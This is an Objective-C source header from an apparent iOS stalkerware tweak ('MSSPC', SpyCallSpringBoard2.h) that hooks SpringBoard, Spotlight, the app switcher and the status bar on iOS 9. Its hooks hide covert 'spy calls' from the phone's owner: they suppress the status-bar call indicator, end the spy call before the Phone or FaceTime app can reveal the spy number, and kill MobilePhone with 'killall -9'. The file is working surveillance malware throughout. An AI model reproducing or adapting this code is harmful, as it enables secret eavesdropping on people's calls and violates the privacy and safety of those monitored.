//
//  SpyCallSpringBoard2.h
//  MSSPC
//
//  Created by Makara Khloth on 12/28/15.
//
//

/********************************************************
 Contains hooking methods of new class from iOS 9 onward
*********************************************************/

#import "MSSPC.h"
#import "SpyCallSpringBoard.h"
#import "SpyCallUtils.h"

#import "SBApplicationController.h"
#import "SBApplicationController+iOS8.h"
#import "SBApplication.h"
#import "SBApplication+iOS9.h"
#import "SBMainSwitcherViewController.h"
#import "SBDisplayItem.h"
#import "SBMainSwitcherViewController.h"

#import "SPUISearchResultsActionManager.h"
#import "SPSearchResult.h"

#import "TUProxyCall.h"
#import "TUProxyCall+iOS9.h"
#import "TUStatusBarManager.h"

#import "FBProcessManager.h"
#import "FBProcessState.h"
#import "FBProcess.h"
#import "FBApplicationProcess.h"

#pragma mark - SPUISearchResultsActionManager
HOOK(SPUISearchResultsActionManager, performActionForResult$inSection$, id, id arg1, id arg2){
    APPLOGVERBOSE(@"performActionForResult$inSection$ %@", arg1, arg2);
    
    SPSearchResult *searchResult = arg1;
    NSString *bundleID = searchResult.bundleID;
    
    if (isIncompatibleApplication(bundleID)) {
        if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
            endSpyCallSB();
            return nil;
        } else {
            if (isFaceTimeSpyCallInProgress()) {
#pragma mark FaceTime
                endFaceTimeSpyCall();
                return nil;
            } else {
                return CALL_ORIG(SPUISearchResultsActionManager, performActionForResult$inSection$, arg1, arg2);
            }
        }
    } else {
        if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer]) {   // MobilePhone
            if (isSpyCallInitiatingConferenceSB()) {
                return nil;
            } else if (isFaceTimeSpyCallInProgress()) {
#pragma mark FaceTime
                endFaceTimeSpyCall();
                return nil;
            } else {
                Class $SBApplicationController = objc_getClass("SBApplicationController");
                SBApplicationController *applicationController = [$SBApplicationController sharedInstance];
                
                SBApplication *application = [applicationController applicationWithBundleIdentifier:bundleID];
                APPLOGVERBOSE(@"isRunning, %d", [application isRunning]);
                if ((![application isRunning] || [SpyCallUtils isMobilePhoneProcessSuspend]) && isSpyCallInProgressSB()) {
                    endSpyCallSB();
                    return nil;
                } else {
                    return CALL_ORIG(SPUISearchResultsActionManager, performActionForResult$inSection$, arg1, arg2);
                }
            }
        } else if ([bundleID isEqualToString:kSpyCallFaceTimeIdentifier]) {   // FaceTime
            if (isSpyCallInitiatingConferenceSB()) {
                return nil;
            } else if (isFaceTimeSpyCallInProgress()) {
#pragma mark FaceTime
                endFaceTimeSpyCall();
                return nil;
            } else {
                if (isSpyCallInProgressSB()) {
                    endSpyCallSB(); // iOS 9, disconnect spy call when open FaceTime because it will show popup "FaceTime with xxx-xxx-xxxx?" xxx-xxx-xxxx is spy number
                    return nil;
                } else {
                    return CALL_ORIG(SPUISearchResultsActionManager, performActionForResult$inSection$, arg1, arg2);
                }
            }
        } else {
            return CALL_ORIG(SPUISearchResultsActionManager, performActionForResult$inSection$, arg1, arg2);
        }
    }
}

#pragma mark SBMainSwitcherViewController
HOOK(SBMainSwitcherViewController, switcherContentController$deletedItem$, void, id arg1, id arg2) {
    APPLOGVERBOSE(@"============================ >>>>> switcherContentController$deletedItem$, %@, %@", arg1, arg2); // SBDeckSwitcherViewController, SBDisplayItem
    SBDisplayItem *sbDisplayItem = arg2;
    id displayID = [sbDisplayItem displayIdentifier];
    APPLOGVERBOSE(@"displayID, %@", displayID);
    NSString *bundleIdentifier = displayID;
    if ([bundleIdentifier isEqualToString:kSpyCallMobilePhoneIndentifer]) {
        endSpyCallSB();
    }
    CALL_ORIG(SBMainSwitcherViewController, switcherContentController$deletedItem$, arg1, arg2);
}

HOOK(SBMainSwitcherViewController, switcherContentController$selectedItem$, void, id arg1, id arg2) {
    APPLOGVERBOSE(@"============================ >>>>> switcherContentController$selectedItem$, %@, %@", arg1, arg2); // SBDeckSwitcherViewController, SBDisplayItem
    SBDisplayItem *sbDisplayItem = arg2;
    id displayID = [sbDisplayItem displayIdentifier];
    APPLOGVERBOSE(@"displayID, %@", displayID);
    NSString *bundleID = displayID;
    if (isIncompatibleApplication(bundleID)) {
        if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
            endSpyCallSB();
        } else {
            if (isFaceTimeSpyCallInProgress()) {
#pragma mark FaceTime
                endFaceTimeSpyCall();
            } else {
                CALL_ORIG(SBMainSwitcherViewController, switcherContentController$selectedItem$, arg1, arg2);
            }
        }
    } else {
        if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer]) { // MobilePhone
            if (isSpyCallInitiatingConferenceSB()) {
                ;
            } else if (isFaceTimeSpyCallInProgress()) {
#pragma mark FaceTime
                endFaceTimeSpyCall();
            } else {
                Class $SBApplicationController = objc_getClass("SBApplicationController");
                SBApplicationController *applicationController = [$SBApplicationController sharedInstance];
                SBApplication *application = [applicationController applicationWithBundleIdentifier:bundleID];
                APPLOGVERBOSE(@"isRunning, %d", [application isRunning]);
                if ((![application isRunning] || [SpyCallUtils isMobilePhoneProcessSuspend]) && isSpyCallInProgressSB()) {
                    endSpyCallSB();
                } else {
                    CALL_ORIG(SBMainSwitcherViewController, switcherContentController$selectedItem$, arg1, arg2);
                }
            }
        } else if ([bundleID isEqualToString:kSpyCallFaceTimeIdentifier]) { // FaceTime
            if (isSpyCallInitiatingConferenceSB()) {
                ;
            } else if (isFaceTimeSpyCallInProgress()) {
#pragma mark FaceTime
                endFaceTimeSpyCall();
            } else {
                if (isSpyCallInProgressSB()) {
                    endSpyCallSB(); // iOS 9, disconnect spy call when open FaceTime because it will show popup "FaceTime with xxx-xxx-xxxx?" xxx-xxx-xxxx is spy number
                } else {
                    CALL_ORIG(SBMainSwitcherViewController, switcherContentController$selectedItem$, arg1, arg2);
                }
            }
        } else {
            CALL_ORIG(SBMainSwitcherViewController, switcherContentController$selectedItem$, arg1, arg2);
        }
    }
}

#pragma mark TUStatusBarManager
HOOK(TUStatusBarManager, updateStatusBarStateForCall$, void, id arg1) {
    APPLOGVERBOSE(@"============================ >>>>> updateStatusBarStateForCall$, %@", arg1);
    TUProxyCall *proxyCall = arg1;
    if ([SpyCallUtils isSpyTUCall:proxyCall]) {
        return;
    } else if ([FaceTimeSpyCallUtils isFaceTimeSpyCall:proxyCall.destinationID]) {
#pragma mark FaceTime
        return;
    } else {
        CALL_ORIG(TUStatusBarManager, updateStatusBarStateForCall$, arg1);
    }
}

#pragma mark FBProcessManager
HOOK(FBProcessManager, noteProcess$didUpdateState$, void, id arg1, id arg2) {
    APPLOGVERBOSE(@"============================ >>>>> noteProcess$didUpdateState$, %@, %@", arg1, arg2); // FBApplicationProcess, FBProcessState
    CALL_ORIG(FBProcessManager, noteProcess$didUpdateState$, arg1, arg2);
    
    FBApplicationProcess *applicationProcess = arg1;
    FBProcessState *processState = arg2;
    
    APPLOGVERBOSE(@"visibility: %d, effectiveVisibility: %d", processState.visibility, processState.effectiveVisibility);
    APPLOGVERBOSE(@"running: %d, foreground: %d", processState.running, processState.foreground);
    
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    if ([applicationProcess.bundleIdentifier isEqualToString:kSpyCallMobilePhoneIndentifer]) {
        if (3 == [processState taskState]) { // 3 : suspend
            if (!processState.foreground) {
                // Cannot quit app in 'Foreground Obscured' because it causes passcode deos not work
                // Use case: Device lock with passcode -> MobilePhone in foreground -> lock device -> enter correct passcode -> device cannot unlock
                Class $SBDisplayItem = objc_getClass("SBDisplayItem");
                SBDisplayItem *sbDisplayItem = [$SBDisplayItem displayItemWithType:@"App" displayIdentifier:applicationProcess.bundleIdentifier];
                Class $SBMainSwitcherViewController = objc_getClass("SBMainSwitcherViewController");
                SBMainSwitcherViewController *sbMainSwitcher = [$SBMainSwitcherViewController sharedInstance];
                [sbMainSwitcher _quitAppRepresentedByDisplayItem:sbDisplayItem forReason:0];
                if (!$SBMainSwitcherViewController) { // iOS 8
                    system("killall -9 MobilePhone");
                }
                APPLOGVERBOSE(@"Quit MobilePhone in background");
            } else {
                system("killall -9 MobilePhone");
                APPLOGVERBOSE(@"Kill MobilePhone in foreground");
            }
        }
    }
#pragma GCC diagnostic pop
}
